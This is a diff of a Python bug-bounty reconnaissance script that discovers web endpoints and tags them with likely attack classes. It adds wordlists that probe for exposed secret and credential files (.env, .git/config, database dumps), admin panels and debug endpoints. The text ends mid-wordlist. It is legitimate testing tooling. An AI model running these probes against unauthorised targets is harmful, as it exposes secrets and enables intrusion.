@@ -1,1082 +1,1696 @@
 #!/usr/bin/env python3
 """
-recon.py — Unauthenticated endpoint discovery & exploit-relevance triage.
-Bug-bounty / authorised pentest use only.
+recon.py — Maximum-coverage endpoint discovery & exploit-relevance triage
+For authorized bug bounty programs and owned targets only.
 
-Phases
-  0. Passive   — robots.txt, sitemap, security.txt, .well-known
-  1. Crawl     — spider HTML + extract from inline/external JS
-  2. Wordlist  — categorised smart brute-force
-  3. Spec      — Swagger/OpenAPI parse, GraphQL introspection
-  4. Triage    — tag each endpoint with attack classes
-  5. Enum      — account enumeration probes (timing + response diff)
-  6. AuthMap   — which endpoints respond without a token
-  7. Verbs     — OPTIONS / method fuzz on high-value paths
+Usage:
+    python3 recon.py https://target.example.com [options]
+
+Options:
+    -c, --concurrency   Parallel requests (default 40)
+    -o, --output        JSON output file
+    --md                Markdown report file
+    --csv               CSV output file
+    -d, --depth         Crawl depth (default 3)
+    --delay             ms delay between requests (default 0)
+    --passive-only      Skip active probing
+    --no-passive        Skip passive sources (Wayback etc)
+    --no-enum           Skip account enumeration
+    --no-verbs          Skip verb tampering
+    --no-cors           Skip CORS testing
+    --no-triage         Discovery only, no exploit triage
+    --tech              Force technology (spring|laravel|django|rails|express|wordpress|drupal)
+    --cookies           Cookies to include (name=value; name2=value2)
+    --headers           Extra headers JSON string
+    --proxy             HTTP proxy (e.g. http://127.0.0.1:8080)
+    -v, --verbose       Verbose output
 """
 
+import argparse
 import asyncio
+import base64
+import csv
+import hashlib
 import json
+import os
 import re
 import sys
 import time
+import urllib.parse
 from collections import defaultdict
 from dataclasses import dataclass, field
-from typing import Optional
-from urllib.parse import urljoin, urlparse, urlencode
+from typing import Dict, List, Optional, Set, Tuple
 
 try:
     import aiohttp
     from bs4 import BeautifulSoup
 except ImportError:
-    print("pip install aiohttp beautifulsoup4")
+    print("[!] Missing deps: pip install aiohttp beautifulsoup4 lxml")
     sys.exit(1)
 
-# ── colour ────────────────────────────────────────────────────────────────────────────
-R  = "\033[0m";  BD = "\033[1m"
-GN = "\033[1;32m"; RD = "\033[1;31m"; YL = "\033[1;33m"
-CY = "\033[0;36m"; MG = "\033[1;35m"; BL = "\033[0;34m"
+# ── ANSI colors ───────────────────────────────────────────────────────────────
 
-def hdr(t):   print(f"\n{YL}{'━'*70}\n  {t}\n{'━'*70}{R}")
-def ok(t):    print(f"  {GN}[+]{R} {t}")
-def info(t):  print(f"  {CY}[i]{R} {t}")
-def step(t):  print(f"  {MG}[→]{R} {t}")
-def warn(t):  print(f"  {YL}[!]{R} {t}")
-def found(t): print(f"  {GN}{BD}[FOUND]{R} {t}")
-def high(t):  print(f"  {RD}{BD}[HIGH]{R}  {t}")
-def crit(t):  print(f"  {RD}{BD}[CRIT]{R}  {t}")
+R = "\033[91m"; Y = "\033[93m"; G = "\033[92m"; B = "\033[94m"
+M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"
+BOLD = "\033[1m"
+
+def banner():
+    print(f"""{R}{BOLD}
+  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
+  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
+  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
+  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
+  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
+  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
+{RST}{Y}  Bug Bounty Endpoint Discovery & Exploit Triage{RST}
+  Authorized testing only — bug bounty / owned targets
+""")
 
 
-# ── Attack-class tags ────────────────────────────────────────────────────────────────
-#  Each tag maps to a reason + suggested follow-up
+# ── Data model ────────────────────────────────────────────────────────────────
 
-TAGS = {
-    "ACCOUNT_ENUM":   "Username/email existence oracle — timing or error diff",
-    "IDOR":           "Object ID in path/param — try other users' IDs",
-    "AUTH_BYPASS":    "Admin/privileged endpoint accessible without token",
-    "INFO_DISC":      "Sensitive data / debug info exposed publicly",
-    "INJECTION":      "Parameter accepted — test SQLi/NoSQLi/SSTI/XSS",
-    "FILE_OPS":       "Upload/download/path — path traversal / SSRF",
-    "BUSINESS_LOGIC": "Financial / coupon / quantity — negative values, races",
-    "JWT":            "Token issue/refresh — alg:none, weak secret, confusion",
-    "OAUTH":          "OAuth/OIDC flow — open redirect, CSRF, grant abuse",
-    "ADMIN":          "Administrative surface — BFLA, mass assignment",
-    "GRAPHQL":        "GraphQL — introspection, IDOR via resolver, mutations",
-    "SSRF":           "URL/target param — server-side request forgery",
-    "OPEN_REDIRECT":  "redirect/next/return_to param — open redirect chain",
-    "MASS_ASSIGN":    "PUT/PATCH with JSON body — role/balance override",
-    "RATE_LIMIT":     "Auth endpoint — check for brute-force protection",
-    "CORS":           "CORS headers — credentialed cross-origin read",
+TAGS_ALL = [
+    "AUTH_BYPASS", "ACCOUNT_ENUM", "IDOR", "INFO_DISC", "INJECTION",
+    "FILE_OPS", "BUSINESS_LOGIC", "JWT", "OAUTH", "ADMIN", "GRAPHQL",
+    "SSRF", "OPEN_REDIRECT", "MASS_ASSIGN", "RATE_LIMIT", "CORS",
+    "XXE", "SSTI", "DESERIALIZATION", "RACE_CONDITION", "CSRF",
+    "PATH_TRAVERSAL", "WEBSOCKET", "CACHE_POISON", "HOST_HEADER",
+    "HTTP_SMUGGLING", "NOSQL", "LDAP", "SQLI", "XSS",
+]
+
+GOLD = {
+    "AUTH_BYPASS", "ACCOUNT_ENUM", "IDOR", "INFO_DISC", "ADMIN",
+    "GRAPHQL", "INJECTION", "SQLI", "SSTI", "XXE", "DESERIALIZATION",
+    "HTTP_SMUGGLING", "SSRF", "JWT",
+}
+SILVER = {
+    "CORS", "MASS_ASSIGN", "OPEN_REDIRECT", "PATH_TRAVERSAL",
+    "BUSINESS_LOGIC", "CACHE_POISON", "HOST_HEADER", "RACE_CONDITION",
+    "NOSQL", "LDAP", "CSRF",
 }
 
-# Pattern → tags mapping (path + param signals)
-TAG_RULES: list[tuple[re.Pattern, list[str]]] = [
-    (re.compile(r"(login|signin|sign-in|authenticate|auth/token)",      re.I),
-     ["ACCOUNT_ENUM", "RATE_LIMIT", "JWT"]),
-    (re.compile(r"(register|signup|sign-up|create.?account|join)",      re.I),
-     ["ACCOUNT_ENUM", "RATE_LIMIT"]),
-    (re.compile(r"(forgot.?pass|reset.?pass|password.?reset|recover)",  re.I),
-     ["ACCOUNT_ENUM"]),
-    (re.compile(r"(verify|confirm|activate|otp|2fa|mfa|totp)",          re.I),
-     ["ACCOUNT_ENUM", "RATE_LIMIT"]),
-    (re.compile(r"(oauth|oidc|sso|saml|connect/auth|authorize)",        re.I),
-     ["OAUTH", "OPEN_REDIRECT"]),
-    (re.compile(r"(token|refresh|jwt|access.?token)",                   re.I),
-     ["JWT"]),
-    (re.compile(r"/users?/\d",                                          re.I),
-     ["IDOR"]),
-    (re.compile(r"/users?/[0-9a-f-]{8,}",                               re.I),
-     ["IDOR"]),
-    (re.compile(r"/(users|accounts|members|profiles)$",                 re.I),
-     ["IDOR", "ADMIN"]),
-    (re.compile(r"/(admin|administrator|manage|management|backoffice|"
-                r"dashboard|panel|console|cms|cp|staff|ops|internal)",  re.I),
-     ["ADMIN", "AUTH_BYPASS", "INFO_DISC"]),
-    (re.compile(r"/(debug|env|config|settings|info|status|health|ping|"
-                r"version|phpinfo|server.?info|actuator)",              re.I),
-     ["INFO_DISC"]),
-    (re.compile(r"/(\.env|web\.config|appsettings\.json|config\.json|"
-                r"database\.yml|secrets\.yml|credentials)",             re.I),
-     ["INFO_DISC"]),
-    (re.compile(r"/(swagger|openapi|api.?docs|redoc|graphiql)",         re.I),
-     ["INFO_DISC"]),
-    (re.compile(r"/graphql",                                             re.I),
-     ["GRAPHQL", "INJECTION"]),
-    (re.compile(r"/(upload|import|file|attachment|media|document|"
-                r"image|avatar|export|download|backup)",                re.I),
-     ["FILE_OPS", "SSRF"]),
-    (re.compile(r"/(fetch|proxy|redirect|forward|request|curl|url)",   re.I),
-     ["SSRF", "OPEN_REDIRECT"]),
-    (re.compile(r"(redirect|return_to|next|callback|continue|"
-                r"redirect_uri|return_url|RelayState)",                 re.I),
-     ["OPEN_REDIRECT", "OAUTH"]),
-    (re.compile(r"/(order|checkout|payment|invoice|cart|coupon|"
-                r"discount|promo|voucher|billing|subscription|refund)", re.I),
-     ["BUSINESS_LOGIC"]),
-    (re.compile(r"/(search|query|filter|find|lookup|autocomplete)",     re.I),
-     ["INJECTION"]),
-    (re.compile(r"/(comment|review|feedback|message|post|note|"
-                r"template|render|preview|report)",                     re.I),
-     ["INJECTION"]),
-    (re.compile(r"\.(php|asp|aspx|cfm|jsp|do|action)$",                re.I),
-     ["INJECTION"]),
-]
-
-# Response-body signals → tags
-BODY_TAG_RULES: list[tuple[re.Pattern, list[str]]] = [
-    (re.compile(r"(jwt|bearer|access_token|refresh_token)",  re.I), ["JWT"]),
-    (re.compile(r"(role|permission|privilege|admin|scope)",  re.I), ["ADMIN"]),
-    (re.compile(r"(ssn|social.?security|credit.?card|cvv)",  re.I), ["INFO_DISC"]),
-    (re.compile(r"(password|passwd|secret|api.?key|token)",  re.I), ["INFO_DISC"]),
-    (re.compile(r"(error|exception|traceback|stack.?trace)", re.I), ["INFO_DISC"]),
-    (re.compile(r"(db_host|db_pass|database|mongo|redis|"
-                r"postgres|mysql|mssql)",                    re.I), ["INFO_DISC"]),
-]
-
-# Interesting response headers
-HEADER_TAG_RULES: list[tuple[str, list[str]]] = [
-    ("access-control-allow-origin",       ["CORS"]),
-    ("access-control-allow-credentials",  ["CORS"]),
-    ("x-powered-by",                      ["INFO_DISC"]),
-    ("server",                            ["INFO_DISC"]),
-    ("x-debug",                           ["INFO_DISC"]),
-    ("x-aspnet-version",                  ["INFO_DISC"]),
-]
-
-
-# ── Categorised wordlist ────────────────────────────────────────────────────────────────────────────
-
-WORDLIST: dict[str, list[str]] = {
-    "auth": [
-        "login", "signin", "sign-in", "logout", "sign-out",
-        "register", "signup", "sign-up", "create-account",
-        "forgot-password", "forgot_password", "reset-password", "reset_password",
-        "password/reset", "password/forgot", "account/password",
-        "verify", "verify-email", "confirm", "activate",
-        "2fa", "mfa", "otp", "totp",
-        "oauth/authorize", "oauth/token", "oauth/callback",
-        "auth", "auth/login", "auth/register", "auth/token", "auth/refresh",
-        "auth/logout", "auth/verify", "auth/callback",
-        "sso", "saml/login", "saml/acs", "saml/metadata",
-        "token", "token/refresh", "token/verify", "token/revoke",
-        "session", "session/create", "session/destroy",
-        "connect/authorize", "connect/token", "connect/userinfo",
-        ".well-known/openid-configuration", ".well-known/oauth-authorization-server",
-        ".well-known/jwks.json", "jwks.json", "certs", "keys",
-    ],
-    "users": [
-        "users", "user", "me", "profile", "account", "accounts",
-        "settings", "preferences", "notifications",
-        "users/1", "users/2", "users/3",
-        "api/v1/users", "api/v1/me", "api/v1/profile", "api/v1/account",
-        "api/v2/users", "api/v2/me",
-        "members", "member", "customer", "customers",
-        "whoami", "current-user", "self",
-        "api/v1/users/1", "api/v1/users/2", "api/v1/users/me",
-    ],
-    "admin": [
-        "admin", "administrator", "admin/login", "admin/dashboard",
-        "admin/users", "admin/settings", "admin/config",
-        "admin/logs", "admin/reports", "admin/metrics",
-        "manage", "management", "management/users",
-        "dashboard", "panel", "control-panel", "cp",
-        "backoffice", "back-office", "cms", "staff",
-        "superadmin", "super-admin", "sysadmin",
-        "internal", "internal/admin", "internal/users",
-        "ops", "operations",
-        "api/v1/admin", "api/v1/admin/users", "api/v1/admin/config",
-        "api/v1/admin/delete_user", "api/v1/internal",
-    ],
-    "api_versioning": [
-        "api", "api/v1", "api/v2", "api/v3", "api/v4",
-        "v1", "v2", "v3",
-        "api/v1/", "api/v2/",
-        "rest", "rest/v1", "rest/v2",
-        "service", "services", "api/latest", "api/beta",
-    ],
-    "info_disclosure": [
-        ".env", ".env.local", ".env.production", ".env.backup",
-        "config.json", "config.yml", "config.yaml", "config.php",
-        "appsettings.json", "appsettings.Development.json",
-        "web.config", "database.yml", "secrets.yml",
-        "debug", "info", "status", "health", "ping", "version",
-        "phpinfo.php", "phpinfo", "server-info", "server-status",
-        "test.php", "test.asp", "info.php",
-        ".git/config", ".git/HEAD", ".svn/entries",
-        "Dockerfile", "docker-compose.yml", ".docker",
-        "package.json", "composer.json", "Gemfile", "requirements.txt",
-        ".htaccess", "nginx.conf", "apache.conf",
-        "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
-        "security.txt", ".well-known/security.txt",
-        "humans.txt", "CHANGELOG.md", "CHANGELOG.txt", "README.md",
-        "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
-        "swagger-ui.html", "swagger-ui", "api-docs", "api-docs.json",
-        "redoc", "redoc.html", "docs", "documentation",
-        "graphql", "graphiql", "playground",
-        "metrics", "prometheus", "grafana", "kibana",
-    ],
-    "spring_actuator": [
-        "actuator", "actuator/health", "actuator/info", "actuator/env",
-        "actuator/metrics", "actuator/mappings", "actuator/beans",
-        "actuator/configprops", "actuator/loggers", "actuator/dump",
-        "actuator/trace", "actuator/httptrace", "actuator/shutdown",
-        "actuator/refresh", "actuator/restart",
-        "manage/health", "manage/info",
-    ],
-    "files_media": [
-        "upload", "uploads", "file", "files",
-        "media", "images", "attachments", "documents",
-        "export", "exports", "import", "imports",
-        "download", "downloads", "backup", "backups",
-        "report", "reports", "invoice", "invoices",
-        "api/v1/upload", "api/v1/files", "api/v1/export",
-        "avatar", "photo", "picture", "thumbnail",
-        "static", "assets", "public", "resources",
-    ],
-    "business": [
-        "orders", "order", "checkout", "cart",
-        "payment", "payments", "pay", "billing",
-        "invoice", "invoices", "subscription", "subscriptions",
-        "coupon", "coupons", "discount", "promo", "voucher",
-        "refund", "refunds", "transfer", "transfers",
-        "withdraw", "deposit", "balance", "wallet",
-        "products", "product", "catalog", "catalogue",
-        "pricing", "plans", "tiers",
-        "api/v1/orders", "api/v1/checkout", "api/v1/payment",
-    ],
-    "ssrf_sinks": [
-        "fetch", "proxy", "redirect", "forward",
-        "request", "url", "curl", "webhook", "webhooks",
-        "callback", "notify", "notification",
-        "ping", "check", "preview",
-        "api/v1/fetch", "api/v1/proxy", "api/v1/webhook",
-    ],
-    "search": [
-        "search", "find", "query", "lookup", "filter",
-        "autocomplete", "suggest", "typeahead",
-        "api/v1/search", "api/v2/search",
-    ],
-    "posts_content": [
-        "posts", "post", "articles", "article",
-        "blog", "blogs", "news", "content",
-        "comments", "comment", "reviews", "review",
-        "messages", "message", "chat", "notifications",
-        "feed", "timeline", "activity",
-        "api/v1/posts", "api/v1/articles", "api/v1/feed",
-    ],
-    "misc": [
-        "logout", "signout",
-        "error", "404", "500",
-        "changelog", "release",
-        "socket.io", "ws", "websocket",
-        "graphql/schema",
-    ],
-}
-
-# Flatten + deduplicate all paths
-ALL_WORDLIST_PATHS = []
-_seen: set[str] = set()
-for cat_paths in WORDLIST.values():
-    for p in cat_paths:
-        p = p.strip("/")
-        if p not in _seen:
-            _seen.add(p)
-            ALL_WORDLIST_PATHS.append(p)
-
-
-# ── Data model ────────────────────────────────────────────────────────────────────────────
 
 @dataclass
 class Endpoint:
     url: str
     path: str
-    status: int
-    methods: list[str] = field(default_factory=list)
-    tags: set[str] = field(default_factory=set)
-    notes: list[str] = field(default_factory=list)
+    status: int = 0
+    methods: List[str] = field(default_factory=list)
+    tags: Set[str] = field(default_factory=set)
+    notes: List[str] = field(default_factory=list)
     requires_auth: Optional[bool] = None
     content_type: str = ""
     body_sample: str = ""
-    source: str = ""          # crawl / wordlist / spec / passive
+    source: str = ""
     redirect_to: str = ""
+    params: List[str] = field(default_factory=list)
+    tech_hints: List[str] = field(default_factory=list)
+    response_headers: Dict[str, str] = field(default_factory=dict)
+    response_size: int = 0
 
 
-# ── HTTP client ────────────────────────────────────────────────────────────────────────────
-
-class HTTP:
-    def __init__(self, base: str, session: aiohttp.ClientSession):
-        self.base = base.rstrip("/")
-        self.session = session
-
-    def abs(self, path: str) -> str:
-        if path.startswith(("http://", "https://")):
-            return path
-        return urljoin(self.base + "/", path.lstrip("/"))
-
-    async def get(self, path: str, *, headers: dict | None = None,
-                  allow_redirects: bool = True, timeout: int = 10):
-        hdrs = {"User-Agent": "Mozilla/5.0 (compatible; SecurityAudit/1.0)"}
-        if headers:
-            hdrs.update(headers)
-        try:
-            async with self.session.get(
-                self.abs(path), headers=hdrs, ssl=False,
-                allow_redirects=allow_redirects,
-                timeout=aiohttp.ClientTimeout(total=timeout),
-            ) as r:
-                body = await r.text(errors="replace")
-                return r.status, dict(r.headers), body, str(r.url)
-        except Exception:
-            return 0, {}, "", ""
-
-    async def post(self, path: str, body: dict | None = None,
-                   raw: bytes | None = None, ct: str | None = None,
-                   headers: dict | None = None, timeout: int = 10):
-        hdrs = {"User-Agent": "Mozilla/5.0 (compatible; SecurityAudit/1.0)"}
-        if ct:
-            hdrs["Content-Type"] = ct
-        if headers:
-            hdrs.update(headers)
-        try:
-            kw: dict = dict(headers=hdrs, ssl=False,
-                            timeout=aiohttp.ClientTimeout(total=timeout))
-            if raw is not None:
-                kw["data"] = raw
-            elif body is not None:
-                kw["json"] = body
-            async with self.session.post(self.abs(path), **kw) as r:
-                b = await r.text(errors="replace")
-                return r.status, dict(r.headers), b
-        except Exception:
-            return 0, {}, ""
-
-    async def options(self, path: str) -> tuple[int, str]:
-        try:
-            async with self.session.options(
-                self.abs(path), ssl=False,
-                timeout=aiohttp.ClientTimeout(total=8),
-                headers={"User-Agent": "Mozilla/5.0"},
-            ) as r:
-                allow = r.headers.get("Allow", r.headers.get("Access-Control-Allow-Methods", ""))
-                return r.status, allow
-        except Exception:
-            return 0, ""
+def score(ep: Endpoint) -> int:
+    s = len(ep.tags)
+    s += sum(3 for t in ep.tags if t in GOLD)
+    s += sum(1 for t in ep.tags if t in SILVER)
+    if ep.status in (200, 201, 204): s += 2
+    if ep.status == 403: s += 1
+    if ep.requires_auth is False: s += 3  # accessible without auth
+    return s
 
 
-# ── Tag helpers ────────────────────────────────────────────────────────────────────────────
+# ── Tag rules (path regex → tags) ────────────────────────────────────────────
 
-def tag_from_path(path: str) -> set[str]:
-    tags: set[str] = set()
-    for pat, t in TAG_RULES:
-        if pat.search(path):
-            tags.update(t)
-    return tags
-
-
-def tag_from_response(status: int, headers: dict, body: str) -> set[str]:
-    tags: set[str] = set()
-    for pat, t in BODY_TAG_RULES:
-        if pat.search(body):
-            tags.update(t)
-    lhdrs = {k.lower(): v for k, v in headers.items()}
-    for hname, t in HEADER_TAG_RULES:
-        if hname in lhdrs:
-            tags.update(t)
-    acac = lhdrs.get("access-control-allow-credentials", "")
-    acao = lhdrs.get("access-control-allow-origin", "")
-    if acac.lower() == "true" and acao not in ("", "null"):
-        tags.add("CORS")
-    return tags
-
-
-def interesting(status: int, body: str) -> bool:
-    if status in (200, 201, 204):
-        return True
-    if status in (301, 302, 307, 308):
-        return True
-    if status == 403:
-        return True
-    if status == 405:
-        return True
-    return False
-
-
-# ── Phase 0: Passive ────────────────────────────────────────────────────────────────────────
-
-PASSIVE_PATHS = [
-    "robots.txt", "sitemap.xml", "sitemap_index.xml",
-    ".well-known/security.txt", "security.txt",
-    "humans.txt", ".well-known/",
-    "crossdomain.xml", "clientaccesspolicy.xml",
+TAG_RULES: List[Tuple[re.Pattern, List[str]]] = [
+    (re.compile(r"/(login|signin|sign[-_]in|authenticate|auth/token|token/obtain|get[-_]token|access[-_]token)", re.I),
+     ["ACCOUNT_ENUM", "RATE_LIMIT", "JWT", "BRUTE_FORCE"]),
+    (re.compile(r"/(register|signup|sign[-_]up|create[-_]account|new[-_]user|join)", re.I),
+     ["ACCOUNT_ENUM", "RATE_LIMIT", "MASS_ASSIGN"]),
+    (re.compile(r"/(forgot[-_]?password|reset[-_]?password|password[-_]?reset|recover|change[-_]?password)", re.I),
+     ["ACCOUNT_ENUM", "HOST_HEADER", "RATE_LIMIT"]),
+    (re.compile(r"/(admin|administrator|manage|management|backoffice|back[-_]office|superadmin|cp|controlpanel|console|staff|internal|restricted)", re.I),
+     ["ADMIN", "AUTH_BYPASS", "INFO_DISC"]),
+    (re.compile(r"/(graphql|gql|graph)", re.I),
+     ["GRAPHQL", "INJECTION", "INFO_DISC"]),
+    (re.compile(r"/(users?|accounts?|members?|profiles?|me|self|whoami|identity)(/|$|\?)", re.I),
+     ["IDOR", "MASS_ASSIGN", "INFO_DISC"]),
+    (re.compile(r"/users?/\d+", re.I),
+     ["IDOR"]),
+    (re.compile(r"/(orders?|invoices?|billing|payment|checkout|cart|purchase|subscribe|subscription|plans?|pricing|coupon|promo|discount|transfer|withdraw|deposit)", re.I),
+     ["BUSINESS_LOGIC", "IDOR", "RACE_CONDITION"]),
+    (re.compile(r"/(upload|import|file|files|media|attachments?|assets?|documents?|export|download|blob|storage|s3|bucket)", re.I),
+     ["FILE_OPS", "PATH_TRAVERSAL", "SSRF", "XXE"]),
+    (re.compile(r"/(fetch|proxy|webhook|callback|redirect|forward|sink|request|outbound|external|ping|check|preview)", re.I),
+     ["SSRF", "OPEN_REDIRECT"]),
+    (re.compile(r"/(oauth|authorize|callback|sso|saml|oidc|openid|token|refresh[-_]?token|client[-_]?credentials)", re.I),
+     ["OAUTH", "JWT", "OPEN_REDIRECT", "CSRF"]),
+    (re.compile(r"/(\.env|config|settings|configuration|setup|secrets?|credentials?|keys?|vault)", re.I),
+     ["INFO_DISC"]),
+    (re.compile(r"/(actuator|health|metrics?|info|status|debug|trace|heapdump|threaddump|env|beans|mappings|loggers?|refresh|restart|shutdown)", re.I),
+     ["INFO_DISC", "ADMIN", "AUTH_BYPASS"]),
+    (re.compile(r"/(swagger|openapi|api[-_]?docs?|api[-_]?spec|redoc|apidoc)", re.I),
+     ["INFO_DISC"]),
+    (re.compile(r"/(search|find|query|filter|autocomplete|suggest|lookup|scan)", re.I),
+     ["INJECTION", "SQLI", "NOSQL", "LDAP"]),
+    (re.compile(r"/(render|template|view|report|generate|pdf|email|notify|preview|compile)", re.I),
+     ["SSTI", "SSRF", "XXE"]),
+    (re.compile(r"/(serialize|deserialize|session|restore|import|job|queue|task|worker)", re.I),
+     ["DESERIALIZATION", "RACE_CONDITION"]),
+    (re.compile(r"/(xmlrpc|rpc|soap|wsdl|xml)", re.I),
+     ["XXE", "INJECTION"]),
+    (re.compile(r"/(websocket|ws|wss|socket\.io|sockjs|signalr|sse|events?/stream|stream)", re.I),
+     ["WEBSOCKET"]),
+    (re.compile(r"/(cache|cdn|vary|purge|invalidate)", re.I),
+     ["CACHE_POISON"]),
+    (re.compile(r"/(git/|\.git/|svn|cvs|bazaar|hg/)", re.I),
+     ["INFO_DISC"]),
+    (re.compile(r"/(phpinfo|php[-_]?info|test\.php|info\.php|_profiler|_wdt)", re.I),
+     ["INFO_DISC"]),
+    (re.compile(r"/(wp[-_]|wordpress|wp-admin|wp-login|wp-json)", re.I),
+     ["INFO_DISC", "AUTH_BYPASS", "INJECTION"]),
+    (re.compile(r"/(eval|exec|system|shell|cmd|command|run|execute|spawn)", re.I),
+     ["INJECTION", "SSTI"]),
+    (re.compile(r"/(share|invite|referral|magic[-_]?link|verify|confirm|activate|2fa|mfa|otp)", re.I),
+     ["ACCOUNT_ENUM", "RATE_LIMIT", "IDOR"]),
+    (re.compile(r"/(messages?|chat|inbox|notifications?|alerts?|feed)", re.I),
+     ["IDOR", "INJECTION", "XSS"]),
+    (re.compile(r"/(report|analytics?|stats?|telemetry|log|audit|history|events?)", re.I),
+     ["INFO_DISC", "IDOR"]),
+    (re.compile(r"/(password|passwd|secret|key|token|cred|credential)", re.I),
+     ["INFO_DISC", "ACCOUNT_ENUM"]),
+    (re.compile(r"\.(bak|backup|old|orig|swp|tmp|save|copy|~)", re.I),
+     ["INFO_DISC"]),
+    (re.compile(r"/(\.well[-_]known|jwks\.json|openid[-_]configuration|security\.txt)", re.I),
+     ["INFO_DISC", "JWT", "OAUTH"]),
+    (re.compile(r"/(internal|private|hidden|undocumented|v0|beta|dev|staging|test|sandbox)", re.I),
+     ["INFO_DISC", "AUTH_BYPASS"]),
+    (re.compile(r"/api/v\d+/", re.I),
+     ["IDOR", "MASS_ASSIGN"]),
+    (re.compile(r"/(bulk|batch|multi|mass)", re.I),
+     ["MASS_ASSIGN", "BUSINESS_LOGIC", "IDOR"]),
+    (re.compile(r"/(role|permission|privilege|grant|revoke|acl|policy|scope)", re.I),
+     ["AUTH_BYPASS", "IDOR", "MASS_ASSIGN"]),
 ]
 
-JS_ROUTE_PATTERN = re.compile(
-    r"""['"` ](/(?:api|v\d+|graphql|auth|admin|login|user|account|oauth|token|"
-    r"register|upload|search|checkout|order|payment)[^'"` \s<>{}]{0,80})['"` ]""",
-    re.IGNORECASE,
-)
-SITEMAP_URL_PAT = re.compile(r"<loc>([^<]+)</loc>", re.IGNORECASE)
+PARAM_SSRF = re.compile(r"^(url|uri|src|href|endpoint|target|host|destination|redirect|return|next|goto|link|webhook|callback|img|image|path|fetch|resource|load|open|feed|ref|site|domain|proxy|forward|out|to|action|continue|return_url|redirect_url|success_url|cancel_url)$", re.I)
+PARAM_IDOR = re.compile(r"^(id|uid|user_id|account_id|userid|account|profile_id|order_id|invoice_id|customer_id|member_id|pid|oid|doc_id|file_id|message_id|session_id|uuid|guid|ref|key|handle|slug)$", re.I)
+PARAM_INJECT = re.compile(r"^(q|query|search|s|filter|where|keyword|term|input|name|username|email|find|selector|sort|order|group|field|column|table|view|template|format|type|action|method|cmd|exec|system|eval|expression|code|script|page|include|module|plugin|theme|lang|locale|timezone|charset|encoding)$", re.I)
 
 
-async def phase_passive(http: HTTP) -> list[str]:
-    hdr("PHASE 0 — PASSIVE RECON (robots / sitemap / security.txt)")
-    paths: list[str] = []
+# ── Wordlists ─────────────────────────────────────────────────────────────────
 
-    for p in PASSIVE_PATHS:
-        s, hdrs, body, _ = await http.get(p)
-        if s == 200 and body:
-            ok(f"/{p}  ({len(body)}b)")
+WORDLIST_GENERAL = [
+    # Auth
+    "login", "signin", "sign-in", "sign_in", "authenticate", "auth",
+    "logout", "signout", "sign-out",
+    "register", "signup", "sign-up", "sign_up", "join", "create-account",
+    "forgot-password", "forgot_password", "reset-password", "reset_password",
+    "password-reset", "password/reset", "account/recover",
+    "verify", "verify-email", "confirm", "activate", "activation",
+    "2fa", "mfa", "otp", "totp", "magic-link",
+    "change-password", "update-password",
+    # OAuth / SSO
+    "oauth", "oauth2", "oauth/authorize", "oauth/token", "oauth/callback",
+    "auth/authorize", "auth/token", "auth/callback", "auth/refresh",
+    "authorize", "token", "refresh-token", "access-token",
+    "sso", "saml", "saml/login", "saml/callback", "saml/metadata",
+    "oidc", "openid", "openid-connect",
+    ".well-known/openid-configuration", ".well-known/jwks.json",
+    ".well-known/oauth-authorization-server", ".well-known/security.txt",
+    # Users / profiles
+    "users", "user", "me", "self", "account", "accounts", "profile",
+    "profiles", "members", "member", "whoami", "identity", "session",
+    "users/1", "users/2", "users/me", "users/profile",
+    "api/v1/users", "api/v1/users/me", "api/v1/me", "api/v1/profile",
+    "api/v2/users", "api/v2/me",
+    # Admin
+    "admin", "administrator", "admin/", "admin/login", "admin/dashboard",
+    "admin/users", "admin/settings", "admin/config", "admin/panel",
+    "administration", "manage", "management", "console", "control",
+    "cp", "controlpanel", "control-panel", "superadmin", "super-admin",
+    "staff", "staff/login", "backoffice", "back-office",
+    "internal", "internal/", "restricted", "privileged",
+    "panel", "dashboard", "dashboards",
+    # API versioning
+    "api", "api/", "api/v1", "api/v2", "api/v3", "api/v4", "api/v5",
+    "api/v1/", "api/v2/", "rest", "rest/", "rest/v1", "rest/v2",
+    "v1", "v1/", "v2", "v2/", "v3", "v3/",
+    "api/current", "api/latest", "api/beta", "api/internal",
+    # Info disclosure
+    ".env", ".env.local", ".env.production", ".env.backup", ".env.bak",
+    "config.json", "config.yaml", "config.yml", "config.toml", "config.php",
+    "configuration.json", "settings.json", "app.config",
+    ".git/HEAD", ".git/config", ".git/COMMIT_EDITMSG",
+    ".gitignore", ".npmrc", ".htaccess", "web.config", "crossdomain.xml",
+    "robots.txt", "sitemap.xml", "sitemap_index.xml",
+    "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
+    "api-docs", "api-docs/", "api/docs", "docs/api", "apidocs",
+    "redoc", "api/swagger.json", "api/openapi.json",
+    "v1/swagger.json", "v2/swagger.json",
+    "api/v1/swagger.json", "api/v1/openapi.json",
+    "graphql", "graphql/", "graphql/console", "graphql/explorer",
+    "gql", "graph", "api/graphql",
+    "phpinfo.php", "info.php", "test.php", "debug.php",
+    ".DS_Store", "Thumbs.db", "desktop.ini",
+    "backup.zip", "backup.sql", "backup.tar.gz", "db.sql",
+    "dump.sql", "database.sql", "export.sql",
+    # Debug / Framework
+    "debug", "debug/", "_debug", "__debug",
+    "healthz", "health", "health/", "health/check", "healthcheck",
+    "ping", "pong", "status", "status/",
+    "ready", "readiness", "liveness", "alive",
+    "version", "build", "build-info", "buildinfo",
+    "metrics", "metrics/", "stats", "statistics",
+    "trace", "traces", "logs", "log",
+    "error", "errors", "500", "404",
+    # Files / media
+    "upload", "uploads", "file", "files", "media", "assets",
+    "attachments", "documents", "images", "images/",
+    "download", "downloads", "export", "exports",
+    "import", "blob", "storage", "s3",
+    "api/v1/files", "api/v1/upload", "api/v1/download",
+    # Business logic
+    "orders", "order", "checkout", "cart", "payment", "payments",
+    "billing", "invoice", "invoices", "subscription", "subscriptions",
+    "plans", "pricing", "coupon", "coupons", "promo", "discount",
+    "transfer", "withdraw", "deposit", "balance", "wallet",
+    "purchase", "buy", "refund", "cancel",
